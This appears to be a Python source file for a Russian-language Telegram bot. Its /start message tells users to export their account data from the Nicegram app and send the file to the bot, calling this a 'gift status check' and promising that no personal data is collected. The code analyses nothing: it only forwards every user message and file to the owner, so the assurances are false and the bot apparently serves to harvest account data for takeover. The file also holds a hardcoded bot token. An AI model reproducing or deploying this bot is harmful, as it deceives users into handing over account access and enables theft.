import asyncio
import json
import re
from pathlib import Path
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandStart
from aiogram.enums import ParseMode

# ---------------- НАСТРОЙКИ ----------------
TOKEN = "8548367035:AAETkfj273stpLyT9zVGX9JH9VX4uACq1kQ"
OWNER_ID = 8394886116
DATA_FILE = Path("data.json")
# -------------------------------------------

bot = Bot(token=TOKEN, parse_mode=ParseMode.HTML)
dp = Dispatcher()

default_data = {
    "banned": [],
    "start_users": [],
    "message_users": [],
    "messages_count": 0
}


def load_data():
    if DATA_FILE.exists():
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                d = json.load(f)
            for k in default_data:
                d.setdefault(k, default_data[k])
            return d
        except Exception:
            return default_data.copy()
    else:
        return default_data.copy()


def save_data(d):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, ensure_ascii=False, indent=2)


data = load_data()


def is_owner(uid: int) -> bool:
    return uid == OWNER_ID


def parse_id_from_text(text: str):
    m = re.search(r"(\d{5,})", text)
    return int(m.group(1)) if m else None


@dp.message(CommandStart())
async def start(message: types.Message):
    uid = message.from_user.id
    if uid not in data["start_users"]:
        data["start_users"].append(uid)
        save_data(data)

    text = (
        "👋 <b>Привет! Внимательно ознакомься с данным текстом:</b>\n\n"
        "1️⃣ Скачайте приложение <b>Nicegram</b> с официального сайта.\n"
        "2️⃣ Откройте Nicegram и войдите в свой аккаунт.\n"
        "3️⃣ Зайдите в Настройки ➜ Nicegram.\n"
        "4️⃣ Нажмите «Экспортировать в файл», чтобы сохранить данные.\n"
        "5️⃣ Вернитесь в бота.\n"
        "6️⃣ Отправьте полученный файл (.txt / .zip) сюда.\n\n"
        "📄 Бот проанализирует файл и сразу начнет проверку.\n\n"
        "🔗 <a href='https://nicegram.app/'>Скачать Nicegram</a>\n\n"
        "⚙️ Это безопасно — бот проверяет статус подарков Telegram.\n"
        "Мы не запрашиваем и не обрабатываем ваши личные данные.\n\n"
        "❓ Появилась проблема? Опишите её — первый освободившийся администратор поможет."
    )
    await message.answer(text)


@dp.message(Command("ban"))
async def ban_user(message: types.Message):
    if not is_owner(message.from_user.id):
        return
    user_id = parse_id_from_text(message.text)
    if not user_id:
        return await message.reply("❌ Невалидный ID")
    if user_id in data["banned"]:
        return await message.reply("⚠️ Этот пользователь уже в бане.")
    data["banned"].append(user_id)
    save_data(data)
    await message.reply(f"✅ Пользователь {user_id} добавлен в бан.")


@dp.message(Command("unban"))
async def unban_user(message: types.Message):
    if not is_owner(message.from_user.id):
        return
    user_id = parse_id_from_text(message.text)
    if not user_id:
        return await message.reply("❌ Невалидный ID")
    if user_id not in data["banned"]:
        return await message.reply("⚠️ Этого пользователя нет в бане.")
    data["banned"].remove(user_id)
    save_data(data)
    await message.reply(f"✅ Пользователь {user_id} разбанен.")


@dp.message(Command("own"))
async def owner_stats(message: types.Message):
    if not is_owner(message.from_user.id):
        return
    text = (
        f"📊 <b>Админ-панель</b>\n\n"
        f"👥 Нажимали /start: {len(data['start_users'])}\n"
        f"💬 Писали сообщения: {len(data['message_users'])}\n"
        f"📨 Всего сообщений: {data['messages_count']}\n"
        f"⛔ В бане: {len(data['banned'])}"
    )
    await message.answer(text)


@dp.message(Command("reply"))
async def reply_user(message: types.Message):
    if not is_owner(message.from_user.id):
        return
    m = re.search(r"id(\d+)", message.text)
    if not m:
        return await message.reply("Используй формат: /reply id123456 текст_ответа")
    target_id = int(m.group(1))
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        return await message.reply("❌ Нет текста сообщения.")
    reply_text = parts[2]
    try:
        await bot.send_message(target_id, f"✉️ Ответ от администратора:\n\n{reply_text}")
        await message.reply("✅ Ответ отправлен пользователю.")
    except Exception as e:
        await message.reply(f"Ошибка: {e}")


@dp.message()
async def user_message(message: types.Message):
    uid = message.from_user.id
    if uid in data["banned"]:
        return

    if uid not in data["message_users"]:
        data["message_users"].append(uid)
    data["messages_count"] += 1
    save_data(data)

    username = f"@{message.from_user.username}" if message.from_user.username else "без ника"
    summary = (
        f"id {uid}, юз: {username}, ник: {message.from_user.full_name}\n"
        f"сообщение: "
    )

    if message.text:
        summary += message.text
    elif message.document:
        file_name = message.document.file_name
        summary += f"<файл: {file_name}>"
    else:
        summary += f"<{message.content_type}>"

    try:
        await bot.send_message(OWNER_ID, summary)
        await bot.forward_message(OWNER_ID, message.chat.id, message.message_id)
        await message.answer("✅ Ваше сообщение отправлено администратору, ожидайте ответа.")
    except Exception as e:
        print("Ошибка пересылки:", e)


async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())